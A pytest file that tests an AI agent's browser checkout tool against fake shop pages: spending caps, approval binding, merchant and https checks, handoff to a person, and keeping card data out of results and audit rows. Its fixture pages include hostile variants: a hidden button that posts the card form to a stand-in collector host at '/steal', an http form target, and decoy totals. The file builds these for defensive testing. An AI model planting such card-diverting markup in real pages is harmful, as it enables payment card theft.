"""browser.checkout end to end: the checks that need no browser against
fakes, then the whole flow (begin -> card -> run -> confirmation) in
headless Chromium against checkout pages served into the session by
route interception on an https origin (the fake site's /checkout markup,
spec §9), a fake vault holding a test card and the real purchase ledger
on the test database. Never a real site, never a real card, never a
headed window."""

from __future__ import annotations

import base64
import io
import json
import re
import uuid
from decimal import Decimal
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from urllib.parse import parse_qs, urlsplit

import pytest
import pytest_asyncio
from sqlalchemy import select

from models.audit import AuditLog, AuditStatus
from services.tools.browser import handoff
from services.tools.browser.act import BrowserActToolkit
from services.tools.browser.actions import BrowserReadToolkit
from services.tools.browser.checkout import CHECKOUT_RULES, NOTICE
from services.tools.browser.pagememory import PageMemory
from services.tools.browser.checkout.ledger import PurchaseLedger
from services.tools.browser.checkout.toolkit import CARD_KEY, BrowserCheckoutToolkit
from services.tools.browser.session import BrowserSessionManager
from services.tools.system import browser_installed
from tests.conftest import make_user

ORIGIN = "https://shop.example.test"
HOST = "shop.example.test"
TEST_NUMBER = "4242424242424242"
TEST_CVC = "987"
TEST_NAME = "Krish Q"
HEX = re.compile(r"^[0-9a-f]+$")


# ── fakes ──────────────────────────────────────────────────────────────────


class FakeVault:
    def __init__(self, *, card: bool = True, available: tuple[bool, str] = (True, "")) -> None:
        self.card = card
        self._available = available
        self.number = TEST_NUMBER
        self.opened: list[str] = []

    def available(self):
        return self._available

    async def get_card_view(self, user_id):
        if not self.card:
            return None
        return SimpleNamespace(
            id="v1", kind="card", label="Visa", masked="Visa ····4242", brand="Visa", last4="4242"
        )

    async def open_card(self, user_id, *, purpose):
        self.opened.append(purpose)
        return SimpleNamespace(
            number=self.number, exp_month=12, exp_year=2028, cvc=TEST_CVC, name=TEST_NAME,
            brand="Visa", last4="4242",
        )


class FakeSettings:
    def __init__(self, per: str = "25", day: str = "50") -> None:
        self.caps = (Decimal(per), Decimal(day))

    async def purchase_caps(self):
        return self.caps


class FakeMemory:
    def __init__(self) -> None:
        self.forgotten: list[str] = []

    def forget(self, user_id):
        self.forgotten.append(user_id)


class FakeLedger:
    def __init__(self) -> None:
        self.rows: list[tuple[str, dict[str, Any]]] = []

    async def spent_last_24h(self, user_id):
        return Decimal("0")

    async def record(self, user_id, event, **fields):
        self.rows.append((event, fields))


class FakeState:
    def __init__(self) -> None:
        self.write_allowed = False
        self.write_origin: str | None = None
        self.human_driving = False
        self.checkout_handoff = False
        self.blocked: list[dict[str, str]] = []
        self.flips: list[bool] = []


class FakeGuard:
    def __init__(self) -> None:
        self.state = FakeState()
        self.installed: list[object] = []

    async def install_egress_guard(self, context, *, account_mode):
        self.installed.append(context)

    async def settle_blocked_navigation(self, page, *, timeout_ms=1500):
        return None

    def egress_state(self, context):
        return self.state


class NoBrowser:
    async def get(self, user_id, *, mode, task_id):
        raise AssertionError("this test must not touch the browser")


class Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


def fake_kit(**over: Any):
    parts: dict[str, Any] = {
        "guard": FakeGuard(), "handoff": handoff, "memory": FakeMemory(), "vault": FakeVault(),
        "ledger": FakeLedger(), "settings": FakeSettings(), "cancel_flag": lambda uid: False,
    }
    parts.update(over)
    return BrowserCheckoutToolkit(NoBrowser(), **parts)


# ── no browser ─────────────────────────────────────────────────────────────


def test_notice_matches_the_fixture_the_frontend_copies():
    fixture = Path(__file__).parent / "fixtures" / "purchase_notice.txt"
    assert fixture.read_text(encoding="utf-8").strip() == NOTICE
    assert "mistakes" in NOTICE and "approve" in NOTICE
    for rule in ("insecure_page", "merchant_mismatch", "over_cap", "screen_changed", "no_card"):
        assert rule in CHECKOUT_RULES


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "params",
    [
        None,
        [],
        {},
        {"merchant": ""},
        {"merchant": 5},
        {"merchant": "shop.example.test", "amount": "lots"},
        {"merchant": "shop.example.test", "amount": -1},
        {"merchant": "shop.example.test", "amount": True},
        {"merchant": "shop.example.test", "amount": 0},
        {"merchant": "shop.example.test", "amount": 1e9},
        {"merchant": "shop.example.test", "note": 3},
        {"merchant": "shop.example.test", "url": "https://x"},
        {"merchant": "shop.example.test", CARD_KEY: {"checkout_id": "x"}},
    ],
)
async def test_precheck_refuses_bad_arguments_without_a_browser(params):
    kit = fake_kit()
    result = await kit.precheck(params, user_id="u1")
    assert result == {"ok": False, "refused": True, "rule": "invalid_arguments", "error": result["error"]}
    assert kit.precheck_sync(params, user_id="u1") == result


@pytest.mark.asyncio
async def test_precheck_passes_good_arguments_and_drops_nulls():
    kit = fake_kit()
    for params in (
        {"merchant": "ticketmaster.com"},
        {"merchant": "ticketmaster", "amount": 23.4, "note": "two tickets"},
        {"merchant": "ticketmaster.com", "amount": "23.40", "note": None},
        {"merchant": "ticketmaster.com", "amount": 5},
    ):
        assert await kit.precheck(params, user_id="u1") is None, params
        assert kit.precheck_sync(params, user_id="u1") is None, params


@pytest.mark.asyncio
async def test_precheck_rules_cancelled_vault_and_card():
    params = {"merchant": "shop.example.test"}
    stopped = fake_kit(cancel_flag=lambda uid: uid == "u1")
    assert (await stopped.precheck(params, user_id="u1"))["rule"] == "cancelled"
    assert await stopped.precheck(params, user_id="u2") is None

    def broken(uid):
        raise RuntimeError("no answer")

    assert (fake_kit(cancel_flag=broken).precheck_sync(params, user_id="u1"))["rule"] == "cancelled"

    closed = fake_kit(vault=FakeVault(available=(False, "Not available in this environment (container).")))
    result = await closed.precheck(params, user_id="u1")
    assert result["rule"] == "vault_unavailable" and "container" in result["error"]
    assert closed.precheck_sync(params, user_id="u1")["rule"] == "vault_unavailable"
    # The key store's reason is already the sentence the owner reads in
    # Settings (the Keychain one, the container one): the refusal is that
    # sentence alone, not "not available: ...not available..." twice over.
    keychain = "Crawler could not open this Mac's Keychain. Unlock the Mac and try again."
    locked = fake_kit(vault=FakeVault(available=(False, keychain)))
    result = await locked.precheck(params, user_id="u1")
    assert result["rule"] == "vault_unavailable" and result["error"] == keychain
    assert locked.precheck_sync(params, user_id="u1")["error"] == keychain
    silent = fake_kit(vault=FakeVault(available=(False, "")))
    assert (await silent.precheck(params, user_id="u1"))["error"] == "The card vault is not available."

    empty = fake_kit(vault=FakeVault(card=False))
    result = await empty.precheck(params, user_id="u1")
    assert result["rule"] == "no_card" and "Settings → Payment card" in result["error"]
    assert empty.precheck_sync(params, user_id="u1") is None  # needs the database: async only

    class BrokenSettings:
        async def purchase_caps(self):
            raise RuntimeError("db down")

    assert (await fake_kit(settings=BrokenSettings()).precheck(params, user_id="u1"))["rule"] == "check_failed"


def test_describe_reads_the_card_facts_not_the_model_words():
    kit = fake_kit()
    arguments = {
        "merchant": "totally-legit-shop", "amount": "1.00",
        CARD_KEY: {
            "checkout_id": "abc", "origin": ORIGIN, "host": HOST, "amount_usd": "23.40",
            "currency": "USD", "items": ["a", "b"], "card_label": "Visa ····4242",
            "outline": "x", "notice": NOTICE,
        },
    }
    assert kit.describe(arguments, user_id="u1") == "Pay $23.40 to shop.example.test (2 items) with Visa ····4242"
    arguments[CARD_KEY]["items"] = ["a"]
    assert "(1 item)" in kit.describe(arguments, user_id="u1")
    arguments[CARD_KEY]["items"] = []
    assert kit.describe(arguments, user_id="u1") == "Pay $23.40 to shop.example.test with Visa ····4242"
    bare = kit.describe({"merchant": "shop.example.test"}, user_id="u1")
    assert bare.startswith("Pay at shop.example.test") and "refused" in bare
    assert kit.describe("nonsense", user_id="u1").startswith("Pay")  # type: ignore[arg-type]


@pytest.mark.asyncio
async def test_run_and_approval_image_need_a_pending_checkout():
    kit = fake_kit()
    bound = {"merchant": HOST, CARD_KEY: {"checkout_id": "deadbeef"}}
    assert kit.approval_image(bound, user_id="u1") is None
    assert kit.approval_image({"merchant": HOST}, user_id="u1") is None
    for arguments, approved in ((bound, False), ({"merchant": HOST}, True), (bound, True)):
        result = await kit.run(dict(arguments), user_id="u1", task_id="t1", approved=approved)
        assert result["ok"] is False and result["refused"] is True
        assert result["rule"] == "unbound_approval", (arguments, approved)


# ── headless Chromium against served checkout pages ───────────────────────


def html(title: str, body: str) -> str:
    return f"<!doctype html><html><head><title>{title}</title></head><body>{body}</body></html>"


ITEMS = '<ul class="items"><li>Concert ticket — $19.00</li><li>Service fee — $4.40</li></ul>'


def card_form(action: str = "/pay") -> str:
    return f"""<form method="post" action="{action}">
<label>Name on card <input name="cc-name" autocomplete="cc-name"></label>
<label>Card number <input name="cc-number" autocomplete="cc-number"></label>
<label>Expiry <input name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY"></label>
<label>CVC <input name="cc-csc" autocomplete="cc-csc"></label>
<button type="submit">Place order</button>
</form>"""


def checkout(total: str, *, action: str = "/pay", form: bool = True) -> str:
    total_line = f'<p id="total">Total: {total}</p>' if total else ""
    return html(
        "Checkout",
        f"<h1>Checkout</h1>{ITEMS}<p>Subtotal $19.00</p>{total_line}{card_form(action) if form else ''}",
    )


PAGES: dict[str, str] = {
    "/checkout": checkout("$23.40"),
    "/checkout-eur": checkout("€23,40"),
    "/checkout-no-total": checkout(""),
    "/checkout-big": checkout("$99.00"),
    "/checkout-no-card": checkout("$23.40", form=False),
    "/checkout-3ds": checkout("$23.40", action="/pay-3ds"),
    "/checkout-selects": html(
        "Checkout",
        """<h1>Checkout</h1>
<table><tr class="line-item"><td>Concert ticket</td><td>$19.00</td></tr>
<tr class="line-item"><td>Service fee</td><td>$4.40</td></tr>
<tr><td>Subtotal</td><td>$19.00</td></tr><tr><th>Order total</th><td>$23.40</td></tr></table>
<form method="post" action="/pay">
<label>Cardholder <input name="holder"></label>
<label>Card number <input name="cardnumber" type="tel"></label>
<label>Month <select name="expmonth"><option value="01">01</option><option value="12">12</option></select></label>
<label>Year <select name="expyear"><option value="2027">2027</option><option value="2028">2028</option></select></label>
<label>Security code <input name="cvv" type="password"></label>
<button type="submit">Pay now</button>
</form>""",
    ),
    # Card fields found by their labels alone, a number box that groups
    # the digits as typed, and a validation stop (a missing ZIP), so the
    # page after "Place order" is this page with the card still in it.
    "/checkout-hint": html("Checkout", f"""<h1>Checkout</h1>{ITEMS}<p>Subtotal $19.00</p><p id="total">Total: $23.40</p>
<form method="post" action="/pay" id="f">
<label>ZIP <input name="zip" id="zip"></label>
<label>Card no <input name="ccnum" id="ccnum" style="width:260px;font-size:18px"></label>
<label>Exp <input name="expdate" id="expdate" placeholder="MM/YY"></label>
<label>CSC <input name="csc" id="csc" style="width:120px;font-size:18px"></label>
<button type="submit">Place order</button>
<p id="err"></p>
</form>
<script>
document.getElementById('ccnum').addEventListener('input', e => {{
  const d = e.target.value.replace(/\\D/g, '');
  e.target.value = d.replace(/(\\d{{4}})(?=\\d)/g, '$1 ');
}});
document.getElementById('f').addEventListener('submit', e => {{
  if (!document.getElementById('zip').value) {{
    e.preventDefault();
    document.getElementById('err').textContent = 'Please enter your ZIP code.';
  }}
}});
</script>"""),
    # Autocomplete card fields with the same validation stop.
    "/checkout-zip": html("Checkout", f"""<h1>Checkout</h1>{ITEMS}<p>Subtotal $19.00</p><p id="total">Total: $23.40</p>
<form method="post" action="/pay" id="f">
<label>ZIP <input name="zip" id="zip" autocomplete="postal-code"></label>
{card_form().split('<form method="post" action="/pay">', 1)[1].rsplit('</form>', 1)[0]}
<p id="err"></p>
</form>
<script>
document.getElementById('f').addEventListener('submit', e => {{
  if (!document.getElementById('zip').value) {{
    e.preventDefault();
    document.getElementById('err').textContent = 'Please enter your ZIP code.';
  }}
}});
</script>"""),
    # An https page whose order form posts to http://.
    "/checkout-mixed": checkout("$23.40", action="http://shop.example.test/pay"),
    # A button attached to the card form from an item line through form=,
    # pointing the card elsewhere through formaction=.
    "/checkout-formaction": checkout("$23.40").replace(
        '<ul class="items">',
        '<ul class="items"><li>Poster <button type="submit" form="payform" '
        'formaction="https://collector.example.test/steal">Place order</button></li>',
    ).replace('<form method="post" action="/pay">', '<form method="post" action="/pay" id="payform">'),
    # The real total is $99.00; text after the form names a smaller one,
    # off screen or in plain sight.
    "/checkout-offscreen": checkout("$99.00").replace(
        "</form>", '</form><p style="position:absolute;left:-10000px">Order total $1.00</p>'
    ),
    "/checkout-note": checkout("$99.00").replace(
        "</form>", '</form><p class="seller-note">Seller note: your total $1.00 after our rebate!</p>'
    ),
    "/order-confirmed": html("Confirmed", "<h1>Thank you</h1><p>Order number 8841</p><p>Paid with the card ending 4242.</p>"),
    "/pay-declined": html("Declined", "<h1>Sorry</h1><p>Your card was declined. Try another card.</p>"),
    "/otp": html(
        "Verify",
        '<h1>Enter the code</h1><form method="post" action="/otp"><label for="otp">Verification code</label>'
        '<input id="otp" name="code" autocomplete="one-time-code" inputmode="numeric"><button>Verify</button></form>',
    ),
    "/grades": html("Grades", "<h1>Grades</h1><p>Nothing to buy here.</p>"),
    "/captcha": html("Are you human", '<h1>One more step</h1><iframe title="reCAPTCHA" src="/recaptcha-frame" width="304" height="78"></iframe>'),
    "/recaptcha-frame": html("reCAPTCHA", "<label><input type='checkbox'> I'm not a robot</label>"),
}


def luhn_ok(number: str) -> bool:
    digits = [int(d) for d in number if d.isdigit()]
    if len(digits) < 13:
        return False
    total = 0
    for i, digit in enumerate(reversed(digits)):
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


class Platform:
    """Headless Chromium, no channel, no persistent profile (the manager
    treats ``container`` as throwaway)."""

    name = "container"

    def __init__(self, root: Path) -> None:
        self._root = root

    def browser_channel(self):
        return None

    def profile_dir(self, user_id: str) -> Path:
        path = self._root / user_id
        path.mkdir(parents=True, exist_ok=True)
        return path


@pytest_asyncio.fixture
async def shop(session_factory, tmp_path):
    if not browser_installed():
        pytest.skip("Playwright's Chromium is not installed (python -m playwright install chromium)")
    user, _ = await make_user(session_factory)
    user_id = str(user.id)
    sessions = BrowserSessionManager(headless=True, platform=Platform(tmp_path), max_sessions=1)
    s = SimpleNamespace(
        user_id=user_id, sessions=sessions, guard=FakeGuard(), vault=FakeVault(), memory=FakeMemory(),
        settings=FakeSettings(), clock=Clock(), cancelled=set(), posted=[], windows=[],
        session_factory=session_factory,
    )
    s.ledger = PurchaseLedger(session_factory)
    s.toolkit = BrowserCheckoutToolkit(
        sessions, guard=s.guard, handoff=handoff, memory=s.memory, vault=s.vault, ledger=s.ledger,
        settings=s.settings, cancel_flag=lambda uid: uid in s.cancelled, clock=s.clock,
    )
    s.session = await sessions.get(user_id, mode="account", task_id="t1")
    s.page = await s.session.page()

    async def handler(route, request):
        path = urlsplit(request.url).path
        if request.method == "POST":
            body = parse_qs(request.post_data or "")
            s.posted.append((path, body))
            # What the network guard's write window said when the order went out.
            s.windows.append((s.guard.state.write_allowed, s.guard.state.write_origin))
            if path == "/pay":
                number = (body.get("cc-number") or body.get("cardnumber") or [""])[0]
                page = PAGES["/order-confirmed"] if luhn_ok(number) else PAGES["/pay-declined"]
            elif path == "/pay-3ds":
                page = PAGES["/otp"]
            else:
                page = html("Thanks", "<h1>Thanks</h1>")
            await route.fulfill(status=200, content_type="text/html; charset=utf-8", body=page)
            return
        body_html = PAGES.get(path)
        if body_html is None:
            await route.fulfill(status=404, content_type="text/plain", body="not found")
            return
        await route.fulfill(status=200, content_type="text/html; charset=utf-8", body=body_html)

    await s.session.context.route("**/*", handler)
    try:
        yield s
    finally:
        await sessions.close_all()


async def open_page(s, path: str, origin: str = ORIGIN) -> None:
    await s.page.goto(f"{origin}{path}", wait_until="domcontentloaded")


async def begin(s, path: str = "/checkout", **params: Any) -> dict[str, Any]:
    await open_page(s, path)
    return await s.toolkit.begin({"merchant": HOST, **params}, user_id=s.user_id, task_id="t1")


async def run(s, arguments: dict[str, Any]) -> dict[str, Any]:
    return await s.toolkit.run(arguments, user_id=s.user_id, task_id="t1", approved=True)


async def audit_rows(s) -> list[AuditLog]:
    async with s.session_factory() as session:
        result = await session.execute(
            select(AuditLog)
            .where(AuditLog.user_id == uuid.UUID(s.user_id), AuditLog.connector_name == "purchases")
            .order_by(AuditLog.seq)
        )
        return list(result.scalars().all())


# The columns a row's content lives in; ids and hashes are random hex, in
# which any short digit run (a CVC) can occur by chance.
CONTENT_COLUMNS = (
    "connector_name", "action", "endpoint", "scope_used", "status", "reasoning_chain",
    "detection_method", "request_data", "response_summary",
)


def row_text(row: AuditLog) -> str:
    return json.dumps({name: getattr(row, name) for name in CONTENT_COLUMNS}, default=str)


def assert_no_card_data(*texts: str) -> None:
    for text in texts:
        for needle in (TEST_NUMBER, TEST_CVC, "4242", "Visa", "data:image", TEST_NAME):
            assert needle not in text, needle


@pytest.mark.asyncio
async def test_begin_makes_the_card_from_the_page_not_the_model(shop):
    s = shop
    arguments = await begin(s, amount=23.4, note="two tickets")
    assert arguments["merchant"] == HOST and arguments["amount"] == "23.40" and arguments["note"] == "two tickets"
    card = arguments[CARD_KEY]
    assert HEX.match(card.pop("checkout_id")) and HEX.match(card.pop("outline"))
    assert card == {
        "origin": ORIGIN,
        "host": HOST,
        "amount_usd": "23.40",
        "currency": "USD",
        "items": ["Concert ticket — $19.00", "Service fee — $4.40"],
        "card_label": "Visa ····4242",
        "submit_to": f"{ORIGIN}/pay",
        "notice": NOTICE,
    }
    # The card's sentence and picture.
    arguments = await begin(s)  # replaces the pending one
    assert s.toolkit.describe(arguments, user_id=s.user_id) == "Pay $23.40 to shop.example.test (2 items) with Visa ····4242"
    image = s.toolkit.approval_image(arguments, user_id=s.user_id)
    assert image is not None and image.startswith("data:image/jpeg;base64,")
    assert s.toolkit.approval_image(arguments, user_id="someone-else") is None
    # Nothing was typed or sent; the number never left the vault.
    assert s.posted == [] and s.vault.opened == []
    assert "data:image" not in json.dumps(arguments) and TEST_NUMBER not in json.dumps(arguments)
    rows = await audit_rows(s)
    assert [r.action for r in rows] == ["purchase_requested", "purchase_requested"]
    assert rows[-1].status == AuditStatus.pending
    assert rows[-1].request_data["amount_usd"] == "23.40" and rows[-1].request_data["merchant"] == HOST
    assert rows[-1].request_data["items"] == 2 and rows[-1].request_data["task_id"] == "t1"
    assert_no_card_data(*(row_text(r) for r in rows))
    assert s.session.task.actions == 2 and s.session.task.summaries[-1].startswith("[step 2] checkout shop.example.test · $23.40")


@pytest.mark.asyncio
async def test_run_fills_the_card_from_the_vault_and_lands_on_the_confirmation(shop):
    s = shop
    arguments = await begin(s, amount=24)  # the model's guess is above the page total, under the cap
    result = await run(s, arguments)
    assert result["ok"] is True, result
    # The page total is what was charged, and what the result and the ledger say.
    assert result["merchant"] == HOST and result["amount"] == "23.40" and result["currency"] == "USD"
    assert "Order number 8841" in result["confirmation_text_summary"]
    assert result["user_image"].startswith("data:image/jpeg;base64,")
    assert result["summary"] == "[step 2] checkout → shop.example.test/pay" and result["mode"] == "account"
    assert set(result) == {"ok", "merchant", "amount", "currency", "confirmation_text_summary", "user_image", "summary", "mode"}
    # The card went to the merchant's form, decrypted at fill time only.
    assert s.vault.opened == [f"checkout {HOST}"]
    (path, body), = s.posted
    assert path == "/pay"
    assert body["cc-number"] == [TEST_NUMBER] and body["cc-csc"] == [TEST_CVC]
    assert body["cc-exp"] == ["12/28"] and body["cc-name"] == [TEST_NAME]
    assert TEST_NAME not in s.session.typed_secrets  # the delivery name is not a secret
    # ... and nowhere else: not in the result, not in the audit log.
    assert TEST_NUMBER not in json.dumps(result)
    assert TEST_CVC not in json.dumps({k: v for k, v in result.items() if k != "user_image"})
    rows = await audit_rows(s)
    assert [r.action for r in rows] == ["purchase_requested", "purchase_approved", "purchase_completed"]
    assert [r.status for r in rows] == [AuditStatus.pending, AuditStatus.approved, AuditStatus.approved]
    assert rows[-1].request_data["amount_usd"] == "23.40" and rows[-1].request_data["merchant"] == HOST
    # Every row names the checkout, which pairs the approval with its outcome.
    assert {r.request_data["checkout_id"] for r in rows} == {arguments[CARD_KEY]["checkout_id"]}
    assert_no_card_data(*(row_text(r) for r in rows))
    assert await s.ledger.spent_last_24h(s.user_id) == Decimal("23.40")
    # The number is redacted for the rest of the task; the act toolkit's page memory is dropped.
    assert TEST_NUMBER in s.session.typed_secrets
    assert s.memory.forgotten == [s.user_id]
    assert s.guard.state.write_allowed is False
    # The card was used up: no picture, no second run.
    assert s.toolkit.approval_image(arguments, user_id=s.user_id) is None
    again = await run(s, arguments)
    assert again["rule"] == "unbound_approval" and len(s.posted) == 1


@pytest.mark.asyncio
async def test_a_page_that_echoes_the_number_is_redacted_in_the_summary(shop):
    s = shop
    original = PAGES["/order-confirmed"]
    PAGES["/order-confirmed"] = html("Confirmed", f"<h1>Thank you</h1><p>Order number 1 paid with {TEST_NUMBER}</p>")
    try:
        result = await run(s, await begin(s))
    finally:
        PAGES["/order-confirmed"] = original
    assert result["ok"] is True
    assert TEST_NUMBER not in result["confirmation_text_summary"] and "•••" in result["confirmation_text_summary"]


@pytest.mark.asyncio
async def test_screen_changed_when_the_page_or_the_total_moved_on(shop):
    s = shop
    arguments = await begin(s)
    await open_page(s, "/grades")
    result = await run(s, arguments)
    assert result == {"ok": False, "refused": True, "rule": "screen_changed", "error": result["error"]}
    assert "changed since you approved" in result["error"]
    # Same page, same structure, different total: refused too.
    arguments = await begin(s)
    await s.page.evaluate("document.getElementById('total').textContent = 'Total: $24.40'")
    assert (await run(s, arguments))["rule"] == "screen_changed"
    # A cart timer ticking is not a change.
    await open_page(s, "/checkout")
    await s.page.evaluate("document.body.insertAdjacentHTML('beforeend', '<p>Cart expires in 9:59</p>')")
    arguments = await s.toolkit.begin({"merchant": HOST}, user_id=s.user_id, task_id="t1")
    await s.page.evaluate("document.body.lastElementChild.textContent = 'Cart expires in 9:58'")
    assert (await run(s, arguments))["ok"] is True
    assert s.posted and len(s.posted) == 1
    rows = await audit_rows(s)
    assert [r.action for r in rows].count("purchase_completed") == 1


@pytest.mark.asyncio
async def test_caps_refuse_before_the_card_exists(shop):
    s = shop
    result = await begin(s, "/checkout-big")
    assert result["rule"] == "over_cap" and "$99.00" in result["error"] and "$25.00" in result["error"]
    result = await begin(s, amount=30)
    assert result["rule"] == "over_cap" and "you expected $30.00" in result["error"]
    await s.ledger.record(
        s.user_id, "purchase_completed", merchant="other.example.test", amount_usd=Decimal("40"),
        currency="USD", items=1, task_id="t0",
    )
    result = await begin(s)
    assert result["rule"] == "over_daily_cap" and "$63.40" in result["error"] and "$40.00" in result["error"]
    s.settings.caps = (Decimal("25"), Decimal("100"))
    assert CARD_KEY in await begin(s)
    rows = await audit_rows(s)
    refused = [r for r in rows if r.action == "purchase_refused"]
    assert [r.reasoning_chain["reason"] for r in refused] == ["over_cap", "over_cap", "over_daily_cap"]
    assert refused[0].request_data["amount_usd"] == "99.00" and refused[0].status == AuditStatus.blocked
    assert s.posted == [] and s.vault.opened == []
    assert_no_card_data(*(row_text(r) for r in rows))


@pytest.mark.asyncio
async def test_run_rechecks_the_caps_after_approval(shop):
    s = shop
    arguments = await begin(s)
    await s.ledger.record(
        s.user_id, "purchase_completed", merchant="other.example.test", amount_usd=Decimal("40"),
        currency="USD", items=1, task_id="t0",
    )
    result = await run(s, arguments)
    assert result["rule"] == "over_daily_cap" and s.posted == [] and s.vault.opened == []


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "path, merchant, rule",
    [
        ("/checkout", "amazon.com", "merchant_mismatch"),
        ("/checkout-no-total", HOST, "no_total"),
        ("/checkout-eur", HOST, "currency"),
        ("/checkout-no-card", HOST, "no_card_fields"),
        ("/grades", HOST, "no_total"),
    ],
)
async def test_page_rules_refuse_with_the_rule_name(shop, path, merchant, rule):
    s = shop
    await open_page(s, path)
    result = await s.toolkit.begin({"merchant": merchant}, user_id=s.user_id, task_id="t1")
    assert result["ok"] is False and result["refused"] is True and result["rule"] == rule, result
    assert s.toolkit.approval_image({"merchant": merchant}, user_id=s.user_id) is None
    assert s.posted == [] and s.vault.opened == []


@pytest.mark.asyncio
async def test_plain_http_is_refused_even_on_the_same_site(shop):
    s = shop
    await open_page(s, "/checkout", origin="http://shop.example.test")
    result = await s.toolkit.begin({"merchant": HOST}, user_id=s.user_id, task_id="t1")
    assert result["rule"] == "insecure_page" and "http://shop.example.test" in result["error"]
    assert s.posted == []


@pytest.mark.asyncio
async def test_a_challenge_page_is_refused_before_the_card(shop):
    s = shop
    await open_page(s, "/captcha")
    result = await s.toolkit.begin({"merchant": HOST}, user_id=s.user_id, task_id="t1")
    assert result["rule"] == "needs_human" and "take over" in result["error"]
    # The page is the person's until the agent's next action: the next
    # begin (on the page they brought back) shuts the window first.
    assert s.guard.state.human_driving is True
    # Before an approved order the handoff opens no order address.
    assert s.guard.state.checkout_handoff is False
    await open_page(s, "/checkout")
    assert CARD_KEY in await s.toolkit.begin({"merchant": HOST}, user_id=s.user_id, task_id="t1")
    assert s.guard.state.human_driving is False


@pytest.mark.asyncio
async def test_selects_and_site_named_fields_are_filled(shop):
    s = shop
    arguments = await begin(s, "/checkout-selects")
    assert arguments[CARD_KEY]["items"] == ["Concert ticket $19.00", "Service fee $4.40"]
    result = await run(s, arguments)
    assert result["ok"] is True, result
    (_path, body), = s.posted
    assert body["cardnumber"] == [TEST_NUMBER] and body["cvv"] == [TEST_CVC]
    assert body["expmonth"] == ["12"] and body["expyear"] == ["2028"] and body["holder"] == [TEST_NAME]


@pytest.mark.asyncio
async def test_a_pending_checkout_expires(shop):
    s = shop
    arguments = await begin(s)
    s.clock.now += 899
    assert s.toolkit.approval_image(arguments, user_id=s.user_id) is not None
    s.clock.now += 2
    assert s.toolkit.approval_image(arguments, user_id=s.user_id) is None
    assert (await run(s, arguments))["rule"] == "unbound_approval"
    assert s.posted == []


@pytest.mark.asyncio
async def test_a_second_factor_after_submit_is_handed_to_the_person(shop):
    s = shop
    arguments = await begin(s, "/checkout-3ds")
    result = await run(s, arguments)
    assert result["ok"] is False and result["filled"] is True
    assert result["needs_human"]["kind"] == "otp" and result["needs_human"]["url"].endswith("/pay-3ds")
    assert result["needs_human"]["user_image"].startswith("data:image/jpeg;base64,")
    # The person types the code in Crawler's window: their submit, and
    # the bank's return to the shop's payment address, pass the guard
    # until the agent acts again.
    assert s.guard.state.human_driving is True and s.guard.state.checkout_handoff is True
    rows = await audit_rows(s)
    assert [r.action for r in rows] == ["purchase_requested", "purchase_approved", "purchase_pending_human"]
    assert rows[-1].status == AuditStatus.pending and rows[-1].reasoning_chain["reason"] == "otp"
    # The card went out: it counts against the daily cap until the person says otherwise.
    assert await s.ledger.spent_last_24h(s.user_id) == Decimal("23.40")
    assert_no_card_data(*(row_text(r) for r in rows))


@pytest.mark.asyncio
async def test_a_declined_card_is_a_filled_failure_on_the_record(shop):
    s = shop
    s.vault.number = "4242424242424241"  # fails Luhn: the fake merchant declines it
    result = await run(s, await begin(s))
    assert result["ok"] is False and result["filled"] is True and "refused" not in result
    assert "declined" in result["error"].lower() and result["user_image"].startswith("data:image/jpeg")
    rows = await audit_rows(s)
    assert rows[-1].action == "purchase_refused" and rows[-1].reasoning_chain["reason"] == "declined"
    assert rows[-1].status == AuditStatus.blocked
    assert await s.ledger.spent_last_24h(s.user_id) == Decimal("0")
    assert "4242424242424241" not in json.dumps(result) and "4242424242424241" not in "".join(row_text(r) for r in rows)


@pytest.mark.asyncio
async def test_stop_between_approval_and_run_pays_nothing(shop):
    s = shop
    arguments = await begin(s)
    s.cancelled.add(s.user_id)
    result = await run(s, arguments)
    assert result["rule"] == "cancelled" and s.posted == [] and s.vault.opened == []


@pytest.mark.asyncio
async def test_a_vault_that_will_not_open_pays_nothing(shop):
    s = shop
    arguments = await begin(s)

    async def broken(user_id, *, purpose):
        raise RuntimeError("keychain said no: /Users/x/Library/Keychains")

    s.vault.open_card = broken
    result = await run(s, arguments)
    assert result["ok"] is False and "refused" not in result and "filled" not in result
    assert "Keychains" not in result["error"] and s.posted == []
    rows = await audit_rows(s)
    assert rows[-1].action == "purchase_refused" and rows[-1].reasoning_chain["reason"] == "vault_open_failed"
    # The refusal settles the approval: nothing counts against the cap.
    assert await s.ledger.spent_last_24h(s.user_id) == Decimal("0")


def fail_ledger_writes(s, event: str) -> None:
    """Make the shop's ledger refuse to write *event* rows (the database
    went away); every other row is written as usual."""
    record = s.ledger.record

    async def failing(user_id, name, **fields):
        if name == event:
            raise RuntimeError("database is locked: /var/db/crawler.sqlite")
        await record(user_id, name, **fields)

    s.ledger.record = failing


@pytest.mark.asyncio
async def test_an_approval_the_ledger_cannot_record_pays_nothing(shop):
    """The approval row is what counts a purchase against the daily cap
    until its outcome is on the record: when it cannot be written the card
    stays in the vault, and the owner is told plainly."""
    from structlog.testing import capture_logs

    s = shop
    arguments = await begin(s)
    fail_ledger_writes(s, "purchase_approved")
    with capture_logs() as logs:
        result = await run(s, arguments)
    assert result["ok"] is False and result["refused"] is True and result["rule"] == "check_failed"
    assert "nothing was paid" in result["error"] and "database" not in result["error"]
    assert s.posted == [] and s.vault.opened == []
    assert any(
        entry.get("event") == "checkout_audit_failed" and entry.get("purchase_event") == "purchase_approved"
        for entry in logs
    )
    # The approval is used up: approving the same card again pays nothing either.
    assert (await run(s, arguments))["rule"] == "unbound_approval"
    assert s.posted == [] and [r.action for r in await audit_rows(s)] == ["purchase_requested"]


@pytest.mark.asyncio
async def test_a_lost_outcome_row_still_counts_against_the_daily_cap(shop):
    """The order went through but its outcome row could not be written:
    the owner still gets the confirmation, the failure is logged as an
    error, and the approval row keeps the purchase on the daily cap."""
    from structlog.testing import capture_logs

    s = shop
    arguments = await begin(s)
    fail_ledger_writes(s, "purchase_completed")
    with capture_logs() as logs:
        result = await run(s, arguments)
    assert result["ok"] is True, result
    lost = [entry for entry in logs if entry.get("event") == "checkout_audit_failed"]
    assert lost and lost[0]["log_level"] == "error" and lost[0]["purchase_event"] == "purchase_completed"
